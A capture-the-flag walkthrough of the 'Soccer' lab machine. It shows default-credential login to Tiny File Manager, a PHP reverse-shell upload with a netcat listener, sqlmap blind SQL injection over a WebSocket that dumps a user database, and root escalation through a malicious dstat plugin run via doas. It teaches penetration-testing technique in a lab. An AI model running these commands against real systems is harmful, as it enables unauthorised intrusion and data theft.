### 80/TCP - HTTP

After adding `soccer.htb` to our `/etc/hosts` file we are greeted with the following page:

![](../../../assets/1215cd28296f28d254b38461662f309e.png)

It's just a one pager, so we'll do a directory enumeration to check whether there are some hidden directories.

#### dirsearch
This one did not return anything useful

```bash

>Task 2: What directory is hosting a file manager but not linked to anywhere on the site?
>A: `/tiny`

After heading to the endpoint we are greeted with the following page:

![](../../../assets/a381869bab7ce19f764edde6a5fcdcb5.png)

We can look up some default creds and try to login with them. After searching it up on Google we find it right away:

![](../../../assets/a338fe9ef2636785393cf2aa5606323c.png)

We try the `Admin` user:

![](../../../assets/fae0640d72081623c175cd8165de8587.png)

Voila, just like that. We notice right away that the version is `2.4.3` as well.

>Task 3: Find creds for the application and log in. What version of Tiny File Manager is running on Soccer?
>A: 2.4.3

Heading into the `tiny` folder we see this:

![](../../../assets/279a3bdaebf0f83a5c550436bcbb17db.png)

Seeing as there's an upload folder this could mean that we can upload a `php-reverse-shell` here.

We start a `netcat listener`

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 1234                        
listening on [any] 1234 ...
```

And we upload the `reverse-shell`

![](../../../assets/7c03a80bada053f1898d8b4cd8468a9f.png)

After this we go click on the file and click on `open`. If it is done correctly the listener should display the following:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 1234                        
listening on [any] 1234 ...

/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

To stabilize the shell we input 

```bash
script /dev/null -c bash
```

Heading into the `/home` directory we see that there's a user called `player`

```bash
www-data@soccer:~$ cd /
cd /
www-data@soccer:/$ cd home
cd home
www-data@soccer:/home$ ls -l
ls -l
total 4
drwxr-xr-x 3 player player 4096 Nov 28  2022 player
```

Further enumeration of the `www-data` user yields no interesting results.
We do however know that the server is running on `nginx`, thus we can take a look at that directory within the `/etc` directory. 

After diving deeper in this directory we find the following file:

```js
// soc-player.htb

server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

We see a mention of another server name, which is a subdomain of the one we're using. Let's add it to our `/etc/hosts` file.

Now when we visit the site we see a different page:

![](../../../assets/5ceb20ee18f27eed30a199b8607ceea8.png)

We try to login using various creds but to no avail, so we register and login as a new user.

![](../../../assets/cdc8b406e41168bb9ca7313c5a25d2aa.png)

Apparently this `ticket id` is important:

```
63374
```

Inputting this ticket tells us it `exists` which means that it may be checking it somehow?

![](../../../assets/4b715718c34a7f5c9dd6b23da46fc734.png)

## SQLI
Indeed it does, it seems it's a script checking `WebSockets` on port `9091`. 
Convenient for us we found that port during our `nmap` scan where it told us it was running `xmltec-xmlmail`. We can test this whether a `SQL-Injection` might be possible.
Since we're dealing with a `Blind SQLI` here, meaning we cannot see the output, we have to use the following command:

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
```

The most important output is this:

![](../../../assets/1172a6889961f57411aa2aa6b7e2be60.png)

We found out that it uses a `MySQL database` and we've found the `databases` that are used. 
`soccer_db` is the one most interesting to us.

We can now go ahead and target `soccer_db` and dump all it's contents using the following command:

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch
```

![](../../../assets/8dbef1f47e783a5925d9d935324ac931.png)

Just like that we've gained info about the `player` user. We can now use it to `SSH` into the machine.

```
player
PlayerOftheMatch2022
```

### user.txt
After logging in we get this flag right away

```bash
player@soccer:~$ ls -l
total 4
-rw-r----- 1 root player 33 Aug 13 10:45 user.txt
player@soccer:~$ cat user.txt 
0ba5e61babaab18ea12a884a32043dfe
player@soccer:~$ 
```

## Privilege Escalation
We try `sudo -l` to no avail
```bash
player@soccer:~$ sudo -l
[sudo] password for player: 
Sorry, user player may not run sudo on localhost.
```

Fortunately for us this one returns us better results:
```bash
find / -perm -u=s -type f 2>/dev/null

```

`doas` is a binary which is similar to `sudo` and has the `SetUID bit set` set in our case. This command should allow us to run commands as another user.

Looking up `doas` on Google we find out that it's config file usually lies within the `/etc` directory:

![](../../../assets/de7fa36475bae323110472c8e9f64003.png)

![](../../../assets/757e37167818318b0311794a867234c1.png)

Correct.

```bash
player@soccer:/usr/local/etc$ cat doas.conf 
permit nopass player as root cmd /usr/bin/dstat
```

Apparently we can run `dstat` without needing `sudo` privileges. 

```bash
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
```

Afterwards we can run the following to verify

```bash
doas /usr/bin/dstat --list
```

![](../../../assets/af6e0a6fc89f6428b596cb161a3194ae.png)

Now we need to run

```bash
doas /usr/bin/dstat --pwn
```

And we should be all set:

```bash
player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --pwn
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/usr/local/share/dstat# 
```

### root.txt

Now that we've escalated our privileges we can go ahead and get the `root` flag.

```bash
root@soccer:/usr/local/share/dstat# cd /root && cat root.txt
7ede078aeb70ef7b253747f50f3bb2d2
```
